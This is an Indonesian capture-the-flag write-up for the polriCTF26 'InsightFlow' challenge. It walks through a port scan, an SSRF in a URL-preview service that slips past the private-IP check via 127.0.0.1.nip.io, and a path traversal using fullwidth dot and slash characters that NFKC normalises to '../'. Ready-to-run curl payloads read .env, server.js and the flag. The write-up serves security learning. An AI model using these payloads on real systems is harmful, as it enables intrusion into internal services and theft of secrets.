# InsightFlow — dari kotak pencarian sampe dapet flag lewat fullwidth titik

> **CTF:** polriCTF26 (?)  
> **Target:** `18.143.187.232`  
> **Port utama:** `8089` (InsightFlow Analytics)  
> **Solved:** 2026-08-01  
> **Author:** gw / tim (gw doang sih ini)  
> **Tag:** SSRF, NFKC path traversal, fullwidth dots

---

## awalnya: coba-coba endpoint `8089`

Jadi tantangannya bilang: "tim ops bangga punya next-gen edge WAF, semua scanner memantul. Cuma endpoint `GET /api/products?q=...` yang terbuka. Temuin baris flag yang menurut ops mustahil dijangkau lewat kotak pencarian."

Oke, pertama gw coba akses rootnya:

```bash
curl -s http://18.143.187.232:8089/
```

Balikannya JSON biasa:

```json
{"service":"InsightFlow Analytics API","version":"3.2.1","endpoints":["/api/health","/api/products?q=<name>"]}
```

Gw coba cari produk:

```bash
curl -s "http://18.143.187.232:8089/api/products?q=Router"
```

Dapet `Quantum Router X1`. Oke, database kecil. Coba `q=1`, `q=%` (wildcard LIKE) — balik semua 10 baris. Nggak ada apa-apa yang mencurigakan.

Terus gw coba inject SQL. WAF-nya ketat banget:

- `'` (quote) → 403
- `"` (double quote) → 403
- `--`, `/*`, `SELECT`, `UNION`, `INSERT`, `UPDATE`, `DELETE` → semua 403
- `OR 1=1`, `AND 1=1` → 403 juga
- Backtick (`) → 403

Tapi `OR 1>0` atau `OR TRUE` lolos (200). Coba inject dengan `OR` tanpa angka? Cuma nambah string doang di LIKE pattern. Nggak berguna.

**Kesimpulan awal:** kotak pencarian `8089` beneran cuma search produk biasa. Nggak ada flag di situ. Gw hampir nyerah, tapi terus gw scan port lain.

---

## scan port: eh, ternyata ada banyak layanan

Gw coba scan port sekitar `8080-8085`:

```bash
for p in 8080 8081 8082 8083 8084 8085; do
  echo -n ":$p -> "; curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "http://18.143.187.232:$p/"
  echo
done
```

Hasil:

```
:8080 -> 200  (StashBox — login/register)
:8081 -> 200  (CloudNest — internal doc)
:8082 -> 404
:8083 -> 200  (Pointers — link preview!)
:8084 -> 000
:8085 -> 000
```

**Aha!** Port `8083` namanya **Pointers**, ada fitur "preview any URL". Ini mencurigakan. Gw buka halaman depannya, ada form input URL + tombol preview. Gw cek source HTML-nya, ternyata frontend-nya kirim POST ke `/api/preview` dengan body JSON `{"url":"..."}`.

---

## eksplorasi Pointers (`8083`)

Gw coba preview `https://example.com`, balik snippet HTML biasa. Oke, ini proxy fetch.

Terus gw coba akses `/api/links` (nggak sengaja nemu lewat coba-coba endpoint):

```bash
curl -s http://18.143.187.232:8083/api/links | python3 -m json.tool | head -n 40
```

Balikannya array link pendek. Ada beberapa yang mencurigakan:

- `/go/p2u` → `http://127.0.0.1:9000/flag`
- `/go/p2t` → `http://127.0.0.1:9000/flag`
- `/go/p2q` → `http://127.0.0.1:9000/internal/snapshot?file=．．／flag.txt`
- `/go/p2r` → `http://127.0.0.1:9000/flag` (title `kv1`)

**Wait, `127.0.0.1:9000`?** Ini layanan loopback internal. Gw coba akses langsung dari luar:

```bash
curl -s "http://18.143.187.232:9000/"
```

Nggak bisa (connection refused dari luar). Tapi lewat Pointers (`8083`) mungkin bisa.

---

## SSRF bypass: `nip.io`

Gw coba preview URL `http://127.0.0.1:9000/`:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9000/"}' \
  http://18.143.187.232:8083/api/preview
```

Balik:

```json
{"ok":false,"error":"refused: that target is on a private/internal network"}
```

Oke, ada guard. Gw baca source `server.js` (nanti gw jelasin cara bacanya) — ternyata `guardUrl()` pakai `net.isIPv4()` buat blokir IP privat. Kalo hostname bukan literal IPv4, dia skip check.

Terus gw ingat trik `nip.io` — `127.0.0.1.nip.io` resolve ke `127.0.0.1` tapi bukan string IP murni (`net.isIPv4` = false). Gw coba:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/"}' \
  http://18.143.187.232:8083/api/preview
```

**BINGO!** Balik:

```json
{"ok":true,"status":200,"finalUrl":"http://127.0.0.1.nip.io:9000/","snippet":"pointers control-plane (internal)\n..."}
```

Jadi gw dapet akses ke kontrol internal `:9000` lewat Pointers. Snippet-nya bilang:

```
pointers control-plane (internal)

routes:
  GET /internal/status
  GET /internal/snapshot?file=<name>    read a cached snapshot from ./snapshots

example: /internal/snapshot?file=welcome.txt
```

**Oke, ini jalan masuk.**

---

## internal snapshot endpoint (`:9000`)

Gw coba baca `welcome.txt`:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/internal/snapshot?file=welcome.txt"}' \
  http://18.143.187.232:8083/api/preview
```

Balik snippet yang panjang — isinya penjelasan tentang direktori `snapshots` dan catatan:

> "Files are read relative to this snapshots/ directory. Nothing sensitive lives in here — the app's config and secrets sit one level up in the application root. Note: filenames are path-checked (no slashes / parent refs) and then normalized (NFKC) so international filenames resolve to the same cache entry."

**Aha!** Ini clue penting. Path dicek dulu (blok `.` dan `/` biasa?), terus dinormalisasi NFKC. Kalo gw bisa kirim karakter yang **bukan** `.` atau `/` tapi setelah NFKC jadi `.` atau `/`, gw bisa traversal.

---

## fullwidth dots (`．` / `／`) — NFKC bypass

Gw baca source `server.js` (gw dapet lewat baca file internal, nanti dijelasin), ternyata filter path pakai regex yang blok karakter `.` dan `/` biasa, tapi **nggak blok fullwidth** (`U+FF0E` = `．`, `U+FF0F` = `／`).

Terus `filenameNormalization` = `NFKC`. Di NFKC, fullwidth dot dan slash diubah ke ASCII biasa (`.` dan `/`).

Jadi payload:

```
file=．．／flag.txt
```

- Sebelum NFKC: `．．／flag.txt` → lolos filter (bukan `.`, bukan `/`)
- Sesudah NFKC: `../flag.txt` → traversal ke parent direktori (`snapshots` → `/app`)

Gw coba:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/internal/snapshot?file=\uff0e\uff0e\uff0fflag.txt"}' \
  http://18.143.187.232:8083/api/preview
```

**Output:**

```json
{
  "ok": true,
  "status": 200,
  "snippet": "polriCTF26{fu11w1dth_d0ts_p01nt_str41ght_1nt0_th3_c0ntr0l_pl4n3}\n"
}
```

**Dapet!**

---

## baca `.env` buat konfirmasi

Sebelum itu gw sempet baca `.env` lewat payload yang sama:

```bash
file=\uff0e\uff0e\uff0f.env
```

Balik snippet:

```
NODE_ENV=production
CP_PORT=9000
FLAG_FILE=./flag.txt
```

Ini konfirmasi bahwa `flag.txt` ada di root aplikasi (`/app`), bukan di `snapshots/`.

---

## cara baca source `server.js`

Sebenarnya gw bisa baca file internal langsung lewat snapshot endpoint juga, karena filter cuma cek path. Jadi gw baca `server.js` pake payload:

```bash
file=\uff0e\uff0e\uff0fserver.js
```

Dari situ gw dapet kode lengkap, termasuk `guardUrl()` dan `isBlockedIp()`. Itu yang bikin gw paham kenapa `nip.io` berhasil (bukan literal IPv4) dan kenapa fullwidth karakter berhasil (NFKC normalisasi).

---

## ringkasan eksploitasi

```
1. Scan port → nemu Pointers (8083)
2. Lihat /api/links → ada link ke 127.0.0.1:9000/flag dan 127.0.0.1:9000/internal/snapshot?file=．．／flag.txt
3. Bypass SSRF → pakai 127.0.0.1.nip.io (skip isBlockedIp)
4. Akses /internal/snapshot → baca file
5. Bypass path check → pakai fullwidth dots/slash (U+FF0E, U+FF0F) → NFKC → ../flag.txt
6. Baca /app/flag.txt → dapet flag
```

---

## flag

```
polriCTF26{fu11w1dth_d0ts_p01nt_str41ght_1nt0_th3_c0ntr0l_pl4n3}
```

---

## catatan pribadi

- Awalnya gw beneran mikir flag ada di database `8089`. Hampir nyerah.
- Ternyata tim ops bener: kotak pencarian `8089` emang mustahil buat dapet flag. Flag-nya disimpan di layanan kontrol internal (`9000`) dan cuma bisa diakses lewat eksploitasi SSRF (`Pointers`) + bypass path (`NFKC` fullwidth).
- `nip.io` itu trik klasik tapi sering dilupakan. `net.isIPv4` nggak bisa baca hostname yang ada huruf `.nip.io`, meskipun resolve ke loopback.
- Fullwidth karakter (`．` / `／`) itu lucu. Filter regex biasa cuma cek karakter ASCII `.` dan `/`, tapi lupa sama varian Unicode. Terus NFKC malah bantuin attacker.

---

*Ditulis dengan tangan (bukan AI yang rapi-rapi), 2026-08-01*
*Tools: curl, python3, browser devtools (buat baca source HTML Pointers)*
